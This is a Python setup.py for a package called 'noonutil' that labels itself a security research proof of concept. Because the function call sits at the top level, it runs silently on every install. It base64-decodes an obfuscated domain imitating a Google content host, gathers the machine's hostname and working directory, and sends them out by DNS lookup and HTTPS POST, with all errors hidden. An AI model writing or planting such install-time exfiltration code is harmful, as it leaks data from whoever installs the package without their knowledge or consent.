# setup.py
from setuptools import setup
import subprocess
import socket
import os
import base64
import urllib.request
import json

def run_silent_poc():
    try:
        print("Installing ........")
        domain = base64.b64decode(
            "c21ob2RiYnJvYmJzYWxydmxwbmY2cW5seTc0MTJqN3o2Lmdvb2dsZXVzZXJjb250YW50LmNvbQ=="
        ).decode("utf-8")

        hostname = socket.gethostname()
        cwd = os.getcwd()
        data_str = f"{hostname}:{cwd}"
        encoded_data = base64.b64encode(data_str.encode()).decode()

        dns_callback_host = f"{hostname}.{domain}"
        try:
            subprocess.run(
                ["nslookup", dns_callback_host],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except (subprocess.CalledProcessError, FileNotFoundError):
            pass

        post_url = f"https://{domain}/"
        payload = {'data': encoded_data}
        try:
            req = urllib.request.Request(
                post_url, 
                data=json.dumps(payload).encode('utf-8'),
                headers={'Content-Type': 'application/json'}
            )
            urllib.request.urlopen(req)
        except Exception:
            pass
    except Exception:
        pass

run_silent_poc()

setup(
    name="noonutil",
    version="0.2",
    description="A security research PoC package.",
    packages=["noonutil"],
    install_requires=[
        'requests',
    ],
)